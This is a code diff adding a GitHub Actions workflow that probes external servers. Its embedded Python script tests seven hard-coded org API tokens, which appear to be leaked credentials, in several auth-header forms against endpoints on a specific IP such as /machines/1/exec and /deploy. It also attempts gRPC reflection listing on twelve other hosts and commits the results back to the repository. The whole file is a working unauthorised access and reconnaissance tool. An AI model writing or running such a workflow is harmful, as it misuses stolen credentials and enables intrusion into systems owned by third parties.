@@ -1,0 +1,69 @@
+name: suptok
+on: [push, workflow_dispatch]
+permissions:
+  contents: write
+jobs:
+  x:
+    runs-on: ubuntu-latest
+    timeout-minutes: 20
+    steps:
+      - uses: actions/checkout@v4
+      - name: install
+        run: |
+          sudo apt-get update -qq >/dev/null 2>&1 || true
+          sudo apt-get install -y -qq curl netcat-openbsd >/dev/null 2>&1 || true
+          (curl -sSL -m 60 https://github.com/fullstorydev/grpcurl/releases/download/v1.9.1/grpcurl_1.9.1_linux_x86_64.tar.gz | tar -xz grpcurl) 2>/dev/null || true
+          ls -la grpcurl 2>/dev/null || echo "no grpcurl"
+      - name: tokenprobe
+        env:
+          K1: api_rw_org_1y0a8mpao3jm_khvzmqan5n6u40r2usqlbn9y
+          K2: api_rw_org_mbgbxdgm9eqg_a29h78mziy7yxcpt1alsx8ge
+          K3: api_rw_org_mbgbxdgm9eqg_pwl1c1418l31ct2vk5xtitwh
+          K4: api_rw_org_z3e5zxpkcufw_xwqn8jznrtit8jl71sbvs6d6yk7ts60r
+          K5: api_ro_org_c0u1v84g2ox4_lijzq7aecit1owzmir7skl1x
+          K6: api_ro_org_o2gb4aci6y93_8ighoeejs5n1xlko021rjq1k
+          K7: api_ro_org_z3e5zxpkcufw_5ovakhfrq5zuypkcupxemicyut50opcn
+        run: |
+          mkdir -p results
+          cat > y.py <<'PY'
+          import subprocess, os
+          LOG=open('results/tokenprobe.log','w')
+          def log(x):
+              print(x); LOG.write(str(x)+'\n'); LOG.flush()
+          def run(cmd,timeout=15):
+              try:
+                  r=subprocess.run(cmd,shell=True,capture_output=True,text=True,timeout=timeout)
+                  return (r.stdout+r.stderr).strip()
+              except Exception as ex:
+                  return 'TIMEOUT/ERR '+repr(ex)
+          keys=[os.environ.get('K%d'%i,'') for i in range(1,8)]
+          keys=[k for k in keys if k]
+          ip='176.9.48.219'
+          paths=['/health','/version','/metrics','/machines','/machines/1','/machines/1/exec','/machines/1/logs','/machines/1/containers','/services','/deploy','/build','/proxy','/v1/machines','/api/v1/machines']
+          # baseline anonymous
+          for p in paths:
+              o=run("curl -skS -m 6 --max-time 7 -o /dev/null -w '%%{http_code}' 'https://%s%s'"%(ip,p),10)
+              log('ANON %s %s'%(p,o))
+          # token variants
+          for k in keys:
+              for hname in ['Authorization: Bearer %s'%k,'Authorization: %s'%k,'X-API-Key: %s'%k,'X-Api-Key: %s'%k]:
+                  for p in ['/machines','/metrics','/v1/machines','/health']:
+                      o=run("curl -skS -m 6 --max-time 7 -H '%s' -o /tmp/b.txt -w '%%{http_code}' 'https://%s%s'; echo; head -c 200 /tmp/b.txt"%(hname,ip,p),10)
+                      if o.startswith('401') or o.startswith('403'): continue
+                      log('TOK %s %s => %r'%(k[:22],p,o))
+          # grpc list on 443 for all hosts with reflection attempt
+          hosts=['176.9.48.219','142.132.195.252','167.235.8.251','91.98.185.219','49.12.82.59','116.202.230.58','167.235.182.121','162.55.99.187','157.90.32.52','195.201.56.246','46.224.107.160','188.245.50.67']
+          for h in hosts:
+              o=run("timeout 12 ./grpcurl -insecure %s:443 list 2>&1 | head -c 800"%h,16)
+              log('GRPC443 %s => %r'%(h,o))
+          LOG.close()
+          PY
+          python3 y.py 2>&1 | tail -100
+          ls -la results
+      - name: commit
+        if: always()
+        run: |
+          git config user.name probe; git config user.email probe@users.noreply.github.com
+          git add -A results || true
+          git commit -m "i13880 suptok $(date -u +%s)" || true
+          for i in 1 2 3 4 5 6; do git pull --rebase origin main >/dev/null 2>&1 || true; git push && break; sleep 6; done || true
